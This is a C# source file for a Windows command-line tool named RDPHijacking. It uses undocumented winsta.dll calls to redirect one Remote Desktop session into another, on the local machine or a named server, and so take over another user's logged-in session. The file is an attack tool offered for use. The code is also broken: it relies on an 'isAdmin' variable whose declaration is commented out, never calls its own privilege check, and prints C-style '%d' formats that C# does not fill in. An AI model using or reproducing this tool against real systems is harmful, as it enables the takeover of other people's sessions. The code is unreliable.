using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Principal;

namespace hijacking
{
    class Program
    {
        [DllImport("winsta.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool WinStationConnectW(IntPtr serverName, int targetSessionId, int sourceSessionId, string password, bool wait);

        [DllImport("winsta.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool WinStationNameFromLogonIdW(IntPtr serverName, int sessionId, string sourceWinStationName);

        [DllImport("winsta.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr WinStationOpenServerW(string serverName);

        [DllImport("winsta.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool WinStationCloseServer(IntPtr serverHandle);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        static extern int wcscmp(string str1, string str2);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool GetComputerNameEx(COMPUTER_NAME_FORMAT nameType, char[] lpBuffer, ref uint lpnSize, IntPtr lpServiceName);



        enum COMPUTER_NAME_FORMAT
        {
            ComputerNameNetBIOS,
            ComputerNameDnsHostname,
            ComputerNameDnsDomain,
            ComputerNameDnsFullyQualified,
            ComputerNamePhysicalNetBIOS,
            ComputerNamePhysicalDnsHostname,
            ComputerNamePhysicalDnsDomain,
            ComputerNamePhysicalDnsFullyQualified
        }




        static void Main(string[] args)
        {
            int session = 0;
            int targetSession = 0;
            string type = "";
            string serverName = "";
            string password = "";
            IntPtr hServerName = (IntPtr)0;
            //bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            string source = "";
            uint errorcode = 0;

            bool IsRunningWithHighIntegrity()
            {
                using (var windowsIdentity = WindowsIdentity.GetCurrent())
                {
                    var windowsPrincipal = new WindowsPrincipal(windowsIdentity);
                    return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }

            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Usage: RDPHijacking.exe -session <session ID> -target <target session ID> -type <server|password> [-server <server name>] [-password <password>]");
                    return;
                }
                for (int i = 0; i < args.Length; i++)
                {
                    if (args[i] == "-session")
                    {
                        if (i + 1 >= args.Length)
                        {
                            throw new ArgumentException("Missing argument value for -session flag.");
                        }
                        if (!int.TryParse(args[i + 1], out session))
                        {
                            throw new ArgumentException("Invalid argument value for -session flag. Expected an integer.");
                        }
                        i++; // Skip the next argument, since it's already been processed
                    }
                    else if (args[i] == "-target")
                    {
                        if (i + 1 >= args.Length)
                        {
                            throw new ArgumentException("Missing argument value for -target flag.");
                        }
                        if (!int.TryParse(args[i + 1], out targetSession))
                        {
                            throw new ArgumentException("Invalid argument value for -target flag. Expected an integer.");
                        }
                        i++;
                    }
                    else if (args[i] == "-type")
                    {
                        if (i + 1 >= args.Length)
                        {
                            throw new ArgumentException("Missing argument value for -type flag.");
                        }
                        type = args[i + 1];
                        i++;
                        if (type == "server")
                        {
                            if (i + 1 >= args.Length)
                            {
                                throw new ArgumentException("Missing argument value for -server flag.");
                            }
                            serverName = args[i + 1];
                            i++;
                        }
                        else if (type == "password")
                        {
                            if (i + 1 >= args.Length)
                            {
                                throw new ArgumentException("Missing argument value for -password flag.");
                            }
                            password = args[i + 1];
                            i++;
                        }
                        else
                        {
                            throw new ArgumentException("Invalid argument value for -type flag. Expected 'server' or 'password'.");
                        }
                    }
                    else
                    {
                        throw new ArgumentException($"Unknown argument: {args[i]}");
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            if (!String.IsNullOrEmpty(serverName))
            {
                Console.WriteLine("Connecting to Server...", serverName);
                hServerName = WinStationOpenServerW(serverName);
            }
            if (!isAdmin)
            {
                Console.WriteLine("Error: You must run this program with administrative privileges.");
                return;
            }
            if (!WinStationNameFromLogonIdW(hServerName, session, source) || !WinStationNameFromLogonIdW(hServerName, targetSession, source))
            {
                errorcode = GetLastError();
                if (errorcode == 5)
                    Console.WriteLine("Error %d: Access denied.", errorcode);
                else if (errorcode == 7022)
                    Console.WriteLine("Error %d: The session id cannot be found.", errorcode);
                else if (errorcode == 1722)
                    Console.WriteLine("Error %d: The RPC server is unavailable.", errorcode);
                else
                    Console.WriteLine("Error %d.", errorcode);
                WinStationCloseServer(hServerName);
                return;
            }
            Console.WriteLine("Redirecting session id %d to session id %d...", targetSession, session);
            if (WinStationConnectW(hServerName, targetSession, session, password, true))
            {
                Console.WriteLine("RDP hijacking is successful.");
            }
            else
            {
                errorcode = GetLastError();
                if (errorcode == 1326)
                    Console.WriteLine("Error %d: Logon failure: unknown user name or bad password.", errorcode);
                else if (errorcode == 7069)
                    Console.WriteLine("Error %d: The target session is incompatible with the current session.", errorcode);
                else if (errorcode == 5)
                    Console.WriteLine("Error %d: Access denied.", errorcode);
                else if (errorcode == 1331)
                    Console.WriteLine("Error %d: This user cannot sign in because this account is currently disabled.", errorcode);
                else if (errorcode == 2250)
                    Console.WriteLine("Error %d: Unable to redirect session %d to session %d. Please check if the session %d is active.", errorcode, targetSession, session, session);
                else
                    Console.WriteLine("Error %d.", errorcode);
            }
            WinStationCloseServer(hServerName);

        }

    }
}

